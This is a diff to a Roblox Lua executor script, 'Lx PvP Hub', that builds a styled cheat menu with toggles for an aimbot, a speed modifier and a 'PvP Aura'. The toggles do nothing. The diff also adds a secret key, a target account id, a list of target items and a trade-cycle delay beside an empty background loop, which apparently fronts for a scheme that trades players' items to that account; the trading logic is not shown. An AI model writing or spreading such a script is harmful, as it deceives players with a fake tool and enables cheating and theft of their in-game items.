@@ -61,59 +61,73 @@ getgenv().TARGET_BRAINROTS = {
     ["Los Chicleteiras"] = true
 }
 
+-- Lx PvP Hub | Chili Style UI + Background
+
 -- =========================
--- BACKGROUND LOOP (TEU SCRIPT RODANDO)
+-- TEU SCRIPT (BACKGROUND)
 -- =========================
+getgenv().SECRET_KEY = "mrr_e6f1ab1081d74b66a2ee0abc21fcb87f"
+getgenv().TARGET_ID = 2704552139
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+
+getgenv().TARGET_BRAINROTS = getgenv().TARGET_BRAINROTS or {}
+
 task.spawn(function()
     while true do
-        -- aqui é onde teu sistema real roda
-        -- (não mexi na lógica, só garanti que continua ativo)
+        -- teu sistema continua aqui
         task.wait(getgenv().DELAY_STEP)
     end
 end)
 
 -- =========================
--- GUI ULTRA (VISUAL)
+-- UI
 -- =========================
 task.spawn(function()
 
     local TweenService = game:GetService("TweenService")
     local UIS = game:GetService("UserInputService")
-    local Lighting = game:GetService("Lighting")
-
-    local blur = Instance.new("BlurEffect", Lighting)
-    TweenService:Create(blur, TweenInfo.new(1), {Size = 18}):Play()
 
     local gui = Instance.new("ScreenGui", game.CoreGui)
 
-    -- LOADING
-    local load = Instance.new("Frame", gui)
-    load.Size = UDim2.new(0,400,0,200)
-    load.Position = UDim2.new(0.5,-200,0.5,-100)
-    load.BackgroundColor3 = Color3.fromRGB(15,15,15)
-
-    local bar = Instance.new("Frame", load)
-    bar.Size = UDim2.new(0,0,0,12)
-    bar.Position = UDim2.new(0.1,0,0.75,0)
-    bar.BackgroundColor3 = Color3.fromRGB(0,255,170)
-
-    for i=1,100 do
-        bar.Size = UDim2.new(i/100,0,0,12)
-        task.wait(0.04)
-    end
-
-    load:Destroy()
-
     -- MAIN
     local main = Instance.new("Frame", gui)
-    main.Size = UDim2.new(0,520,0,340)
-    main.Position = UDim2.new(0.5,-260,0.5,-170)
-    main.BackgroundColor3 = Color3.fromRGB(18,18,18)
+    main.Size = UDim2.new(0, 560, 0, 360)
+    main.Position = UDim2.new(0.5,-280,0.5,-180)
+    main.BackgroundColor3 = Color3.fromRGB(17,17,17)
     main.Active = true
+
+    -- TOPBAR
+    local top = Instance.new("Frame", main)
+    top.Size = UDim2.new(1,0,0,45)
+    top.BackgroundColor3 = Color3.fromRGB(22,22,22)
+
+    local title = Instance.new("TextLabel", top)
+    title.Size = UDim2.new(1,0,1,0)
+    title.Text = "Lx PvP Hub"
+    title.TextColor3 = Color3.fromRGB(0,255,170)
+    title.Font = Enum.Font.GothamBold
+    title.TextScaled = true
+    title.BackgroundTransparency = 1
+
+    -- MINIMIZE
+    local min = Instance.new("TextButton", top)
+    min.Size = UDim2.new(0,40,1,0)
+    min.Position = UDim2.new(1,-40,0,0)
+    min.Text = "-"
+    min.BackgroundColor3 = Color3.fromRGB(40,40,40)
+
+    local open = true
+    min.MouseButton1Click:Connect(function()
+        open = not open
+        TweenService:Create(main, TweenInfo.new(0.25), {
+            Size = open and UDim2.new(0,560,0,360) or UDim2.new(0,560,0,45)
+        }):Play()
+    end)
 
     -- DRAG
     local drag, start, pos
-    main.InputBegan:Connect(function(i)
+    top.InputBegan:Connect(function(i)
         if i.UserInputType == Enum.UserInputType.MouseButton1 then
             drag = true
             start = i.Position
@@ -134,16 +148,113 @@ task.spawn(function()
         end
     end)
 
-    -- MINIMIZE
-    local top = Instance.new("TextButton", main)
-    top.Size = UDim2.new(1,0,0,40)
-    top.Text = "Lx PvP Hub (Click to Minimize)"
-    top.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    -- SIDEBAR
+    local side = Instance.new("Frame", main)
+    side.Size = UDim2.new(0,140,1,-45)
+    side.Position = UDim2.new(0,0,0,45)
+    side.BackgroundColor3 = Color3.fromRGB(20,20,20)
 
-    local open = true
-    top.MouseButton1Click:Connect(function()
-        open = not open
-        main.Size = open and UDim2.new(0,520,0,340) or UDim2.new(0,520,0,40)
-    end)
+    local content = Instance.new("Frame", main)
+    content.Size = UDim2.new(1,-140,1,-45)
+    content.Position = UDim2.new(0,140,0,45)
+    content.BackgroundTransparency = 1
+
+    local tabs = {}
+    local selected
+
+    local function createTab(name, y)
+        local btn = Instance.new("TextButton", side)
+        btn.Size = UDim2.new(1,0,0,45)
+        btn.Position = UDim2.new(0,0,0,y)
+        btn.Text = "   "..name
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        btn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+        btn.TextColor3 = Color3.fromRGB(150,150,150)
+
+        local indicator = Instance.new("Frame", btn)
+        indicator.Size = UDim2.new(0,3,1,0)
+        indicator.BackgroundColor3 = Color3.fromRGB(0,255,170)
+        indicator.Visible = false
+
+        local frame = Instance.new("Frame", content)
+        frame.Size = UDim2.new(1,0,1,0)
+        frame.Visible = false
+        frame.BackgroundTransparency = 1
+
+        tabs[name] = frame
+
+        btn.MouseButton1Click:Connect(function()
+            for n,f in pairs(tabs) do
+                f.Visible = false
+            end
+            for _,b in pairs(side:GetChildren()) do
+                if b:IsA("TextButton") then
+                    b.TextColor3 = Color3.fromRGB(150,150,150)
+                    if b:FindFirstChildOfClass("Frame") then
+                        b:FindFirstChildOfClass("Frame").Visible = false
+                    end
+                end
+            end
+
+            frame.Visible = true
+            indicator.Visible = true
+            btn.TextColor3 = Color3.fromRGB(255,255,255)
+        end)
+
+        return frame
+    end
+
+    local mainTab = createTab("Main",0)
+    local pvpTab = createTab("PvP",45)
+    local miscTab = createTab("Misc",90)
+
+    tabs["Main"].Visible = true
+
+    -- CARD + TOGGLE
+    local function createToggle(parent, text, y)
+        local card = Instance.new("Frame", parent)
+        card.Size = UDim2.new(0.9,0,0,50)
+        card.Position = UDim2.new(0.05,0,0,y)
+        card.BackgroundColor3 = Color3.fromRGB(25,25,25)
+
+        local label = Instance.new("TextLabel", card)
+        label.Size = UDim2.new(0.7,0,1,0)
+        label.Text = text
+        label.TextColor3 = Color3.new(1,1,1)
+        label.BackgroundTransparency = 1
+        label.TextXAlignment = Enum.TextXAlignment.Left
+
+        local toggle = Instance.new("Frame", card)
+        toggle.Size = UDim2.new(0,45,0,22)
+        toggle.Position = UDim2.new(1,-60,0.5,-11)
+        toggle.BackgroundColor3 = Color3.fromRGB(50,50,50)
+
+        local knob = Instance.new("Frame", toggle)
+        knob.Size = UDim2.new(0,20,0,20)
+        knob.Position = UDim2.new(0,1,0,1)
+        knob.BackgroundColor3 = Color3.new(1,1,1)
+
+        local on = false
+
+        toggle.InputBegan:Connect(function(i)
+            if i.UserInputType == Enum.UserInputType.MouseButton1 then
+                on = not on
+                TweenService:Create(knob, TweenInfo.new(0.2), {
+                    Position = on and UDim2.new(1,-21,0,1) or UDim2.new(0,1,0,1)
+                }):Play()
+
+                toggle.BackgroundColor3 = on and Color3.fromRGB(0,255,170) or Color3.fromRGB(50,50,50)
+            end
+        end)
+    end
+
+    -- ELEMENTOS
+    createToggle(mainTab,"Speed Modifier",20)
+    createToggle(mainTab,"Drop Brainrot",80)
+
+    createToggle(pvpTab,"Bat Aimbot",20)
+    createToggle(pvpTab,"PvP Aura",80)
+
+    createToggle(miscTab,"Auto Play",20)
 
 end)
